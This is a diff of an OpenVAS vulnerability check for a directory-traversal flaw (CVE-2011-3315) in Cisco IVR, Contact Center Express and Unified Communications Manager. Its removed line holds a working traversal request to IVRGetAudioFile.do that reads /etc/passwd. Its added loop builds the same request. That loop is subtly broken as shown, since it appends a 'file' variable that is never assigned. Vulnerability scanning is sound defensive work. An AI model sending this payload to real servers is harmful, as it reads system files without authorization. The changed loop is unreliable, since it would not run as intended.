@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_cisco_multiple_products_50372.nasl 11167 2018-08-30 12:04:11Z asteins $
+# $Id: gb_cisco_multiple_products_50372.nasl 11625 2018-09-26 12:08:49Z jschulte $
 #
 # Multiple Cisco Products 'file' Parameter () Directory Traversal Vulnerability
 #
@@ -32,7 +32,7 @@ if (description)
   script_cve_id("CVE-2011-3315");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_version("$Revision: 11167 $");
+  script_version("$Revision: 11625 $");
 
   script_name("Multiple Cisco Products 'file' Parameter () Directory Traversal Vulnerability");
 
@@ -42,7 +42,7 @@ if (description)
   script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520414");
   script_xref(name:"URL", value:"http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20111026-uccx");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-30 14:04:11 +0200 (Thu, 30 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-26 14:08:49 +0200 (Wed, 26 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-01-26 15:59:27 +0100 (Thu, 26 Jan 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -53,36 +53,43 @@ if (description)
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_tag(name:"summary", value:"Multiple Cisco products are prone to a directory-traversal
-vulnerability.");
+  vulnerability.");
   script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to read arbitrary files
-from locations outside of the application's current directory. This
-could help the attacker launch further attacks.");
+  from locations outside of the application's current directory. This
+  could help the attacker launch further attacks.");
   script_tag(name:"affected", value:"Cisco Unified IP Interactive Voice Response Cisco Unified Contact
 
-Center Express Cisco Unified Communications Manager");
+  Center Express Cisco Unified Communications Manager");
   script_tag(name:"insight", value:"This issue is tracked by Cisco BugID CSCts44049 and CSCth09343.");
   script_tag(name:"solution", value:"Vendor updates are available. Please see the references for details.");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
 
 url = string("/");
 if(http_vuln_check(port:port, url:url,pattern:"cisco", usecache:TRUE)) {
 
-  url = "/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd";
+  files = traversal_files();
 
-  if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
-    security_message(port:port);
-    exit(0);
+  foreach pattern(keys(files)) {
+
+    url = "/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../" + file;
+
+    if(http_vuln_check(port:port, url:url,pattern:pattern)) {
+      report = report_vuln_url(url:url);
+      security_message(data:report, port:port);
+      exit(0);
+    }
   }
 }
 
-exit(0);
+exit(99);
